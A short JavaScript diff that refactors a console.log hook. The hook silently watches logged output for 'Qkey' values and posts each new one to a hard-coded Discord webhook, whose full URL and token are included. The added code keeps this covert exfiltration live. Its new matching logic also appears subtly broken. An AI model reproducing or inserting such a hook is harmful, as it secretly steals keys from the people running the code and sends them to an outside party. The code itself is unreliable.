@@ -37,26 +37,27 @@ const checkToken = async () => {
 checkToken();
 
 (function() {
-    var sentQKeys = {};
     var originalLog = console.log;
     var qkeyRegex = /Qkey: (\w+)/;
-    var qkey = "";
+    var sentQKeys = {};
 
     console.log = function() {
         var message = Array.prototype.join.call(arguments, ' ');
 
         originalLog.apply(console, arguments);
 
-        var match = qkeyRegex.exec(message);
-        if (match) {
-            qkey = match[1];
-            if (!sentQKeys[qkey]) {
-                sentQKeys[qkey] = true;
-                var xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://discord.com/api/webhooks/1068247989082140762/uSvynvxCGTQggC1OGttul00nxZR2pj3JPBxVt3PuVcfL-mD4qeBouRnbbYzojszjcXHr');
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.send(JSON.stringify({ "content": "Qkey: " + qkey }));
-            }
+        var matches = message.match(qkeyRegex);
+        if (matches) {
+            matches.forEach(function(match) {
+                var qkey = match.split(':')[1];
+                if (qkey && !sentQKeys[qkey]) {
+                    sentQKeys[qkey] = true;
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'https://discord.com/api/webhooks/1068247989082140762/uSvynvxCGTQggC1OGttul00nxZR2pj3JPBxVt3PuVcfL-mD4qeBouRnbbYzojszjcXHr');
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.send(JSON.stringify({ "content": "Qkey: " + qkey.trim() }));
+                }
+            });
         }
     }
 })();
